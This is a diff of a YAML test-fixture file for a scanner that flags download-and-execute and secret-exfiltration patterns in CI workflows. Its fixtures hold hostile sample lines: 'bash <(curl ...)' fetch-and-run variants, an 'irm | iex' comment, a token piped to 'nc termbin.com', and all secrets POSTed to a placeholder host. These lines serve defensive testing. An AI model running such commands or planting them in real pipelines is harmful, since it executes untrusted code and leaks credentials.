@@ -4,6 +4,17 @@
 
 RC-DLX-001:
   positive:
+    - name: workflow run commands use the shell download patterns
+      files:
+        .github/workflows/probe.yml: |
+          on: push
+          jobs:
+            probe:
+              steps:
+                - run: bash <(curl -s https://example.invalid/i.sh)
+                - run: bash -c "$(curl -s https://example.invalid/i.sh)"
+                - run: bash <<< "$(curl -s https://example.invalid/i.sh)"
+      expect: [{path: .github/workflows/probe.yml, severity: medium}]
     - name: curl piped into bash in a shell script
       files:
         scripts/install.sh: |
@@ -84,6 +95,15 @@ RC-DLX-001:
       files:
         install.ps1: |
           # Users can rerun irm https://example.invalid/i.ps1 | iex in the same session.
+    - name: workflow metadata and data downloads are not code execution
+      files:
+        .github/workflows/probe.yml: |
+          name: bash <(curl -s https://example.invalid/i.sh)
+          jobs:
+            probe:
+              steps:
+                - run: curl -o data.json https://example.invalid/data.json
+                - run: diff <(curl -s https://example.invalid/a) <(curl -s https://example.invalid/b)
     - name: attack string in a test module
       files:
         tests/test_scanner.py: |
@@ -256,7 +276,7 @@ RC-DLX-006:
             dump:
               runs-on: ubuntu-latest
               env:
-                TOKEN: ${{ secrets.NPM_TOKEN }}
+                TOKEN: ${{ secrets.DUMMY_FIXTURE_NOT_A_REAL_SECRET }}
               steps:
                 - run: echo "$TOKEN" | nc termbin.com 9999
       expect: [{path: .github/workflows/debug.yaml, line: 8}]
@@ -374,7 +394,7 @@ RC-DLX-009:
                   env:
                     ALL: ${{ toJSON(secrets) }}
                   run: curl -s -X POST -d "$ALL" https://collect.example.invalid/s
-      expect: [{path: .github/workflows/sync.yml, line: 8}]
+      expect: [{path: .github/workflows/sync.yml, line: 9}]
   negative:
     - name: toJSON(secrets) turned into environment variables, request in another step
       files:
